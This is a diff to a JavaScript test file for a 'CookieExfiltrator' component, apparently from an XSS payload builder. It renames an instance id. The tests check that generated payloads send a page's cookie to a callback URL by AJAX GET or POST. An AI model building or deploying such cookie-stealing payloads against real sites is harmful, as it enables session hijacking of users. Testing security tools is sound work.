@@ -36,7 +36,7 @@ describe('CookieExfiltrator', () => {
     describe('if the exfiltration method is `post:ajax`', () => {
       it('should post the cookie using an XMLHttpRequest', () => {
         const payload = cook({
-          id: 'instance-id',
+          id: 'instance_id',
           callbackUrl: 'http://127.0.0.1/',
           method: 'post:ajax'
         }, {
@@ -45,7 +45,7 @@ describe('CookieExfiltrator', () => {
 
         expect(payload).toEqual(
           expect.stringContaining(
-            `ajaxRequest('POST', 'http://127.0.0.1/', c, instance-id-cb)`
+            `ajaxRequest('POST', 'http://127.0.0.1/', c, instance_id_cb)`
           )
         )
       })
@@ -77,7 +77,7 @@ describe('CookieExfiltrator', () => {
     describe('if the exfiltration method is `get:ajax`', () => {
       it('should exfiltrate the cookie using an XMLHttpRequest', () => {
         const payload = cook({
-          id: 'instance-id',
+          id: 'instance_id',
           callbackUrl: 'http://127.0.0.1/',
           method: 'get:ajax'
         }, {
@@ -86,7 +86,7 @@ describe('CookieExfiltrator', () => {
 
         expect(payload).toEqual(
           expect.stringContaining(
-            `ajaxRequest('GET', 'http://127.0.0.1/?c=' + c, undefined, instance-id-cb)`
+            `ajaxRequest('GET', 'http://127.0.0.1/?c=' + c, undefined, instance_id_cb)`
           )
         )
       })
@@ -95,7 +95,7 @@ describe('CookieExfiltrator', () => {
     describe('if the "wait for request to finish" option is enabled', () => {
       it('should place the next entry point in the callback', () => {
         const payload = cook({
-          id: 'instance-id',
+          id: 'instance_id',
           callbackUrl: 'http://127.0.0.1/',
           method: 'get:ajax',
           waitForResponse: true
@@ -105,7 +105,7 @@ describe('CookieExfiltrator', () => {
 
         expect(payload).toEqual(
           expect.stringContaining(
-            `var instance-id-cb = function () { __XSS_CHEF_ENTRY_POINT__ }`
+            `var instance_id_cb = function () { __XSS_CHEF_ENTRY_POINT__ }`
           )
         )
 
@@ -116,7 +116,7 @@ describe('CookieExfiltrator', () => {
     describe('if the "wait for request to finish" option is not enabled', () => {
       it('should place the next entry point at the end of the script', () => {
         const payload = cook({
-          id: 'instance-id',
+          id: 'instance_id',
           callbackUrl: 'http://127.0.0.1/',
           method: 'get:ajax',
           waitForResponse: false
@@ -126,7 +126,7 @@ describe('CookieExfiltrator', () => {
 
         expect(payload).toEqual(
           expect.stringContaining(
-            `var instance-id-cb = function () { }`
+            `var instance_id_cb = function () { }`
           )
         )
 
